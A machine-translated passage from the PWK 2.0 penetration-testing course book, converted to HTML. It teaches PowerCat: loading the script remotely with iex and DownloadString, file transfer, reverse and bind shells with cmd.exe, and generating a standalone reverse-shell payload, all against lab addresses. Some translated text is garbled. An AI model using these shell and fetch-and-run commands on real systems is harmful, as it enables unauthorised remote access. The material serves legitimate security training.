<div style="position:absolute;top:108205;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">91</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:107224;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在当前 PowerShell 范围内可用。</font><font style="vertical-align: inherit;">通过这种方式，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的PowerCat</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">直接功能</font></font></nobr></div>
<div style="position:absolute;top:107243;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell 而不是每次都执行脚本。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:107278;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Users\Offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">.\powercat.ps1</font></font></font></b></nobr></div>
<div style="position:absolute;top:107297;left:272"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 109 - 使用点源加载本地 PowerShell 脚本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:107327;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果目标机器连接到互联网，我们可以通过一次远程脚本来做同样的事情</font></font></nobr></div>
<div style="position:absolute;top:107346;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">再次使用方便的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iex</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> cmdlet，如下所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:107381;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Users\Offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iex (New-Object System.Net.Webclient).DownloadString('https://raw.</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:107398;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">githubusercontent.com/besimorhino/powercat/master/powercat.ps1')</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:107417;left:293"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 110 - 使用 iex 加载远程 PowerShell 脚本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:107447;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">值得注意的是，以这种方式加载的脚本只会在当前的 PowerShell 中可用</font></font></nobr></div>
<div style="position:absolute;top:107466;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实例，每次我们重新启动 PowerShell 时都需要重新加载。</font></font></nobr></div>
<div style="position:absolute;top:107499;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们的脚本已加载，我们可以</font><font style="vertical-align: inherit;">按如下</font><font style="vertical-align: inherit;">方式执行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powercat</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:107534;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Users\offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powercat</font></font></font></b></nobr></div>
<div style="position:absolute;top:107551;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您必须选择客户端模式 (-c) 或侦听模式 (-l)。</font></font></nobr></div>
<div style="position:absolute;top:107570;left:266"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 111 - 直接在 PowerShell 中执行 powercat 函数</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:107600;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以通过查看帮助菜单快速熟悉Powercat：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:107634;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Users\offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powercat -h</font></font></font></b></nobr></div>
<div style="position:absolute;top:107652;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powercat - Netcat，Powershell 版本</font></font></nobr></div>
<div style="position:absolute;top:107668;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Github 存储库：https://github.com/besimorhino/powercat</font></font></nobr></div>
<div style="position:absolute;top:107702;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此脚本尝试在 powershell 中实现 netcat 的功能</font></font></nobr></div>
<div style="position:absolute;top:107719;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脚本。</font><font style="vertical-align: inherit;">它还包含额外的功能，例如内置继电器、执行</font></font></nobr></div>
<div style="position:absolute;top:107736;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell 和 dnscat2 客户端。</font></font></nobr></div>
<div style="position:absolute;top:107770;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用法：powercat [-c or -l] [-p port] [options]</font></font></nobr></div>
<div style="position:absolute;top:107804;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-c &lt;ip&gt;    </font></font></nobr></div>
<div style="position:absolute;top:107804;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户端模式。</font><font style="vertical-align: inherit;">提供您要连接的系统的 IP。</font></font></nobr></div>
<div style="position:absolute;top:107821;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果您使用 -dns，请指定要向其发送查询的 DNS 服务器。</font></font></nobr></div>
<div style="position:absolute;top:107855;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-l    </font></font></nobr></div>
<div style="position:absolute;top:107855;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">聆听模式。</font><font style="vertical-align: inherit;">在 -p 指定的端口上启动侦听器。</font></font></nobr></div>
<div style="position:absolute;top:107889;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-p &lt;端口&gt; 端口。</font><font style="vertical-align: inherit;">要连接的端口或要侦听的端口。</font></font></nobr></div>
<div style="position:absolute;top:107923;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-e &lt;proc&gt; 执行。</font><font style="vertical-align: inherit;">指定要启动的进程的名称。</font></font></nobr></div>
<div style="position:absolute;top:107940;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:107957;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-i &lt;输入&gt; 输入。</font><font style="vertical-align: inherit;">提供要在连接后立即通过管道发送的数据</font></font></nobr></div>
<div style="position:absolute;top:107974;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已确立的。</font><font style="vertical-align: inherit;">用于移动文件。</font><font style="vertical-align: inherit;">您可以提供 fi 的路径</font></font></nobr></div>
<div style="position:absolute;top:107991;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个字节数组对象，或一个字符串。</font><font style="vertical-align: inherit;">您还可以通过管道传输任何这些 int</font></font></nobr></div>
<div style="position:absolute;top:108008;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powercat，像'aaaaaa' | </font><font style="vertical-align: inherit;">电源猫 -c 10.1.1.1 -p 80</font></font></nobr></div>
<div style="position:absolute;top:108025;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:108042;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-G    </font></font></nobr></div>
<div style="position:absolute;top:108042;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成有效载荷。</font><font style="vertical-align: inherit;">将脚本作为将执行 t 的字符串返回</font></font></nobr></div>
<div style="position:absolute;top:108059;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powercat 与您指定的选项。</font><font style="vertical-align: inherit;">-i、-d 和 -rep 将</font></font></nobr></div>
<div style="position:absolute;top:108076;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">被纳入。</font></font></nobr></div>
<div style="position:absolute;top:108109;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-ge    </font></font></nobr></div>
<div style="position:absolute;top:108109;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成编码的有效载荷。</font><font style="vertical-align: inherit;">与 -g 相同，但返回一个字符串</font></font></nobr></div>
<div style="position:absolute;top:108127;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以这样执行：powershell -E &lt;encoded string&gt; </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:108283;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="92"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 92 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:108316;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:109393;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:109393;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:109393;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">92</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:108412;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-H    </font></font></nobr></div>
<div style="position:absolute;top:108412;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印此帮助消息。</font></font></nobr></div>
<div style="position:absolute;top:108428;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:108448;left:351"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 112 - Powercat 帮助菜单</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:108477;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们回顾一下我们是如何使用 powercat 进行文件传输以及绑定和反向 shell 的</font></font></nobr></div>
<div style="position:absolute;top:108497;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用以前的工具。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:108531;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.3.5 Powercat 文件传输</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:108569;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尽管我们可以使用前面讨论过的任何工具将 Powercat 传输到我们的目标，</font></font></nobr></div>
<div style="position:absolute;top:108588;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们来看看如何使用powercat将自己（powercat.ps1）从Bob转移到Alice作为一种方式</font></font></nobr></div>
<div style="position:absolute;top:108608;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 powercat 演示文件传输。</font></font></nobr></div>
<div style="position:absolute;top:108641;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，我们在 Alice 的计算机上运行一个 Netcat 监听器：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:108675;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo nc -lnvp 443 &gt; received_powercat.ps1</font></font></font></b></nobr></div>
<div style="position:absolute;top:108692;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听[任何] 443 ...</font></font></nobr></div>
<div style="position:absolute;top:108709;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从（未知）[10.11.0.22] 63661 连接到 [10.11.0.4]</font></font></nobr></div>
<div style="position:absolute;top:108729;left:270"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 113 - 使用 nc 为 powercat 文件传输设置侦听器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:108758;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们将</font><font style="vertical-align: inherit;">在 Bob 的计算机上</font><font style="vertical-align: inherit;">调用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powercat</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">该</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-c</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项指定客户端模式，并设置</font></font></nobr></div>
<div style="position:absolute;top:108778;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">监听IP地址，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-p</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定连接的端口号，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-i</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表示本地文件</font></font></nobr></div>
<div style="position:absolute;top:108797;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将被远程传输：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:108832;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Users\Offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1</font></font></font></b></nobr></div>
<div style="position:absolute;top:108851;left:339"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 114 - 使用 powercat 发送文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:108881;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后，Alice 将杀死 Netcat 进程并检查文件是否已收到：</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:108915;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">^C</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:108932;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font><b><font color="#0070c0"><font style="vertical-align: inherit;">ls正在接收</font></font></b><font style="vertical-align: inherit;">_powercat.ps1</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"></font></font></b></nobr></div>
<div style="position:absolute;top:108949;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接收_powercat.ps1</font></font></nobr></div>
<div style="position:absolute;top:108969;left:283"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 115 - 验证通过 powercat 发送的文件的接收</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:109000;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.3.6 Powercat 反向壳</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:109037;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">反向shell过程与我们已经看到的类似。</font><font style="vertical-align: inherit;">我们将启动一个 Netcat 监听器</font></font></nobr></div>
<div style="position:absolute;top:109057;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Alice 的电脑，然后 Bob 将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powercat</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发送一个反向 shell。</font></font></nobr></div>
<div style="position:absolute;top:109090;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们从 Alice 机器上的 Netcat 监听器开始：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:109125;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo nc -lvp 443</font></font></font></b></nobr></div>
<div style="position:absolute;top:109142;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听[任何] 443 ...</font></font></nobr></div>
<div style="position:absolute;top:109161;left:202"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 116 - 使用 nc 设置侦听器以便从 powercat 接收反向 shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:109190;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，Bob 将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powercat</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发送一个反向 shell。</font><font style="vertical-align: inherit;">在此示例中，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-e</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项指定</font></font></nobr></div>
<div style="position:absolute;top:109210;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接到侦听端口后</font><font style="vertical-align: inherit;">要执行的应用程序 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmd.exe</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:109245;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Users\offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powercat -c 10.11.0.4 -p 443 -e cmd.exe</font></font></font></b></nobr></div>
<div style="position:absolute;top:109264;left:288"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 117 - 使用 powercat 发送反向 shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:109294;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后，Alice 的 Netcat 侦听器将收到 shell：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:109328;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从（未知）[10.11.0.22] 63699 连接到 [10.11.0.4]</font></font></nobr></div>
<div style="position:absolute;top:109345;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows [版本 10.0.17134.590] </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:109471;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="93"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 93 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:109504;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:110581;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:110581;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:110581;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">93</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:109600;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(c) 2018 年微软公司。</font><font style="vertical-align: inherit;">版权所有。</font></font></nobr></div>
<div style="position:absolute;top:109633;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\用户\offsec&gt;</font></font></nobr></div>
<div style="position:absolute;top:109653;left:318"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 118 - 接收 powercat 反向 shell</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:109684;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.3.7 Powercat 绑定壳</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:109722;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">相比之下，一个 powercat 绑定 shell 在 Bob 一侧启动，并带有一个</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powercat</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">侦听器。</font><font style="vertical-align: inherit;">我们将使用</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:109742;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-l</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项用于创建侦听器，</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-p</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于指定侦听端口号，</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-e</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于创建应用程序</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:109761;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmd.exe</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 连接后执行：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:109796;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Users\offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powercat -l -p 443 -e cmd.exe</font></font></font></b></nobr></div>
<div style="position:absolute;top:109815;left:317"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 119 - 使用 powercat 设置绑定 shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:109845;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，Alice 将创建一个到 Bob 计算机上的绑定 shell 的 Netcat 连接：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:109879;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc 10.11.0.22 443</font></font></font></b></nobr></div>
<div style="position:absolute;top:109896;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows [版本 10.0.17134.590]</font></font></nobr></div>
<div style="position:absolute;top:109913;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(c) 2018 年微软公司。</font><font style="vertical-align: inherit;">版权所有。</font></font></nobr></div>
<div style="position:absolute;top:109947;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\用户\offsec&gt;</font></font></nobr></div>
<div style="position:absolute;top:109966;left:263"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 120 - 使用 nc 连接到由 powercat 创建的绑定 shell</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:109998;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.3.8 Powercat 独立有效载荷</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:110035;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Powercat 还可以生成独立的有效载荷。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">99</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 powercat 的上下文中，有效载荷是一组</font></font></nobr></div>
<div style="position:absolute;top:110055;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell 指令以及 powercat 脚本本身仅包含</font></font></nobr></div>
<div style="position:absolute;top:110074;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户要求的功能。</font><font style="vertical-align: inherit;">让我们在下一个示例中试验有效载荷。</font></font></nobr></div>
<div style="position:absolute;top:110107;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Alice 的机器上启动侦听器后，我们通过添加创建一个独立的反向 shell 负载</font></font></nobr></div>
<div style="position:absolute;top:110126;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">前一个</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">powercat</font></font></b><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-g</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项</font><font style="vertical-align: inherit;">并将输出重定向到文件。</font><font style="vertical-align: inherit;">这会</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:110146;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成一个鲍勃可以在他的机器上执行的 powershell 脚本：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:110181;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Users\offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powercat -c 10.11.0.4 -p 443 -e cmd.exe -g &gt; reverseshell.ps1</font></font></font></b></nobr></div>
<div style="position:absolute;top:110214;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Users\offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">./reverseshell.ps1</font></font></font></b></nobr></div>
<div style="position:absolute;top:110234;left:291"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 121 - 创建和执行独立的有效负载</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
